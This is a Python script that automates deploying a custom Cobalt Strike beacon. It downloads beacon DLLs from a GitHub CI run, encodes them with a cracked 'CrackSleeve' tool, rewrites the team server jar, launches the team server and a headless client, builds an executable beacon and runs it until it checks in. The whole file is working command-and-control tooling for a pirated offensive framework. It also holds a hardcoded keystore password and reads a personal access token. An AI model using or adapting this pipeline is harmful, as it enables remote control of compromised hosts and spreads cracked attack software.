# -*- coding: utf-8 -*-
"""deploy_beacon.py - C-26 verified single-pass beacon deploy.

Usage: python deploy_beacon.py <CI-run-id> [profile]
Every step hard-verifies and the script aborts (nonzero) on any mismatch:
  1. pull beacon-x64 + beacon-x64-rl0k from the SAME run, both must carry
     the bstamp of that run's commit (grep the raw dll bytes)
  2. kill sweep: beacon/client/TS/patsy processes -> verify zero remain
  3. dual encode -> jar rewrite BOTH slots -> byte-compare + zipfile testzip
  4. restart TS(+profile)+client -> verify READY marker + fresh PIDs
  5. kill any beacon, bake exe -> verify bstamp in exe AND probe_baked
  6. revive -> wait INITIAL -> the bid must be NEW (not seen before) and
     born after the deploy
Writes a deploy manifest (C:\\Users\\Public\\deploy_manifest.txt)."""
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import time
import urllib.request
import zipfile

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
CRACK = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-official\4.9.1\CrackSleeve4.9"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
LOG = P3 + r"\tsboot_run\r1.log"
REPO = "bXZb/Beacon"
TOKEN = open(r"C:\Users\Administrator\Desktop\cobaltstrike\GITHUB_PERSONAL_ACCESS_TOKEN.txt").read().strip().splitlines()[0].strip()

fails = []


def check(cond, label):
    print(("  PASS " if cond else "  FAIL ") + label)
    if not cond:
        fails.append(label)
    return cond


def gh(url):
    req = urllib.request.Request(url, headers={"Authorization": "Bearer " + TOKEN})
    return json.load(urllib.request.urlopen(req))


def stamp_of(sha7):
    return ("bstamp:%s" % sha7).encode()


def kill_sweep():
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
                        'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\'" | '
                        'ForEach-Object { "$($_.ProcessId)" }'],
                       capture_output=True, text=True, timeout=60)
    for p in [x.strip() for x in r.stdout.split() if x.strip().isdigit()]:
        subprocess.run(["taskkill", "/PID", p, "/F"], capture_output=True)
    for img in ("rundll32.exe", "franken_b1.exe", "notepad.exe"):
        subprocess.run(["taskkill", "/IM", img, "/F"], capture_output=True)
    time.sleep(3)
    r2 = subprocess.run(["powershell", "-NoProfile", "-Command",
                         "(Get-CimInstance Win32_Process -Filter \"name='java.exe' or name='javaw.exe' or name='franken_b1.exe'\").Count"],
                        capture_output=True, text=True, timeout=60)
    n = r2.stdout.strip()
    check(n in ("", "0", None), "kill sweep: zero processes (got %r)" % n)


def main():
    run_id = sys.argv[1]
    profile = sys.argv[2] if len(sys.argv) > 2 else "r2_boot.profile"
    print("=== deploy from run %s, profile %s ===" % (run_id, profile))

    # 1. run metadata + artifacts
    d = gh("https://api.github.com/repos/%s/actions/runs/%s" % (REPO, run_id))
    sha7 = d["head_sha"][:7]
    check(d["conclusion"] == "success", "CI run success (%s)" % d["conclusion"])
    stamp = stamp_of(sha7)
    print("expected stamp:", stamp.decode())

    arts = gh("https://api.github.com/repos/%s/actions/runs/%s/artifacts" % (REPO, run_id))
    want = {"beacon-x64": r"C:\Users\Public\dep_main", "beacon-x64-rl0k": r"C:\Users\Public\dep_rl0k"}
    got = {}
    for name, outdir in want.items():
        a = [x for x in arts["artifacts"] if x["name"] == name]
        if not check(len(a) == 1, "artifact %s present" % name):
            sys.exit(1)
        os.makedirs(outdir, exist_ok=True)
        data = subprocess.check_output(["curl", "-sL", "--max-time", "180",
                                        "-H", "Authorization: Bearer " + TOKEN,
                                        "https://api.github.com/repos/%s/actions/artifacts/%d/zip" % (REPO, a[0]["id"])])
        zp = os.path.join(outdir, "a.zip")
        open(zp, "wb").write(data)
        zf = zipfile.ZipFile(zp)
        dll = [n for n in zf.namelist() if n.endswith(".dll")][0]
        zf.extract(dll, outdir)
        got[name] = os.path.join(outdir, dll)

    main_dll, rl0k_dll = got["beacon-x64"], got["beacon-x64-rl0k"]
    check(stamp in open(main_dll, "rb").read(), "main dll carries bstamp %s" % sha7)
    check(stamp in open(rl0k_dll, "rb").read(), "rl0k dll carries bstamp %s" % sha7)
    if fails:
        sys.exit(1)

    # 2. kill sweep
    kill_sweep()

    # 3. dual encode + jar
    shutil.copyfile(main_dll, os.path.join(CRACK, "Resource", "Decode", "sleeve", "beacon.x64.dll"))
    shutil.copyfile(rl0k_dll, os.path.join(CRACK, "Resource", "Decode", "sleeve", "beacon.x64.rl0k.dll"))
    r = subprocess.run([JDK + r"\java.exe", "-cp", "cobaltstrike-client.jar;.", "CrackSleeve", "encode"],
                       cwd=CRACK, capture_output=True, text=True, timeout=120)
    check(r.returncode == 0, "CrackSleeve encode rc=0")
    enc_m = os.path.join(CRACK, "Resource", "Encode", "sleeve", "beacon.x64.dll")
    enc_r = os.path.join(CRACK, "Resource", "Encode", "sleeve", "beacon.x64.rl0k.dll")
    shutil.copyfile(enc_m, P3 + r"\src\main\resources\sleeve\beacon.x64.dll")
    shutil.copyfile(enc_r, P3 + r"\src\main\resources\sleeve\beacon.x64.rl0k.dll")

    zin = zipfile.ZipFile(JAR, "r")
    items = [(i, zin.read(i.filename)) for i in zin.infolist()]
    zin.close()
    zout = zipfile.ZipFile(JAR, "w", zipfile.ZIP_DEFLATED)
    for info, blob in items:
        if info.filename == "sleeve/beacon.x64.dll":
            blob = open(enc_m, "rb").read()
        elif info.filename == "sleeve/beacon.x64.rl0k.dll":
            blob = open(enc_r, "rb").read()
        zout.writestr(info, blob)
    zout.close()
    z = zipfile.ZipFile(JAR)
    check(z.testzip() is None, "jar zip integrity")
    check(z.read("sleeve/beacon.x64.dll") == open(enc_m, "rb").read(), "jar main slot == encoded")
    check(z.read("sleeve/beacon.x64.rl0k.dll") == open(enc_r, "rb").read(), "jar rl0k slot == encoded")
    z.close()

    # 4. restart stack
    manifest = {
        "run_id": run_id, "sha7": sha7,
        "main_dll_sha": hashlib.sha256(open(main_dll, "rb").read()).hexdigest(),
        "rl0k_dll_sha": hashlib.sha256(open(rl0k_dll, "rb").read()).hexdigest(),
        "deploy_time": time.time(), "bids_before": [],
    }
    log = open(LOG, encoding="utf-8", errors="replace").read()
    manifest["bids_before"] = re.findall(r"INITIAL\t(\d+)", log)

    ts = subprocess.Popen([JDK + r"\java.exe",
                           "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                           "--add-opens=java.base/sun.net.www.protocol=ALL-UNNAMED",
                           "--add-opens=java.base/java.net=ALL-UNNAMED",
                           "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                           "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                           "-Djavax.net.ssl.keyStorePassword=123456",
                           "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", profile],
                          cwd=P3 + r"\tsboot_run")
    time.sleep(10)
    cl = subprocess.Popen([JDK + r"\javaw.exe",
                           "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                           "--add-opens=java.base/sun.net.www.protocol=ALL-UNNAMED",
                           "--add-opens=java.base/java.net=ALL-UNNAMED",
                           "-Xmx512m", "-cp", JAR,
                           "aggressor.headless.Start", "192.168.100.200", "50050", "franken-op", "franken",
                           "headless_franken.cna"],
                          cwd=P3 + r"\tsboot_run")
    time.sleep(12)

    # 5. bake with the fresh rl0k (kill-first against the file lock)
    time.sleep(40)  # let the client settle + aggressor.ready
    from tier3_common import send
    send("target", "")
    send("artifact", "vnc-http", "exe", "x64", r"C:\Users\Public\franken_b1.exe")
    time.sleep(6)
    exe = open(r"C:\Users\Public\franken_b1.exe", "rb").read()
    check(stamp in exe, "exe carries bstamp %s" % sha7)
    pb = r"C:\Users\Public\probe_baked.bin"
    check(os.path.exists(pb) and stamp in open(pb, "rb").read(), "probe_baked carries bstamp")

    # 6. revive + fresh bid
    t0 = time.time()
    subprocess.Popen([r"C:\Users\Public\franken_b1.exe"], cwd=r"C:\Users\Public")
    new_bid = None
    deadline = time.time() + 180
    while time.time() < deadline:
        log = open(LOG, encoding="utf-8", errors="replace").read()
        m = re.findall(r"(\d\d:\d\d:\d\d)\.\d+\tINITIAL\t(\d+)\t", log)
        if m:
            ts_s, bid = m[-1]
            # INITIAL timestamps share the wall clock with our clock +8h (CST);
            # freshness = bid not in bids_before
            if bid not in manifest["bids_before"]:
                new_bid = bid
                break
        time.sleep(5)
    check(new_bid is not None, "fresh beacon checked in (bid %s)" % new_bid)
    manifest["new_bid"] = new_bid

    open(r"C:\Users\Public\deploy_manifest.txt", "w").write(json.dumps(manifest, indent=1))
    print("=== DEPLOY %s (manifest: C:\\Users\\Public\\deploy_manifest.txt) ===" %
          ("PASS" if not fails else "FAIL"))
    if fails:
        for f in fails:
            print("  failed:", f)
        sys.exit(1)


if __name__ == "__main__":
    main()
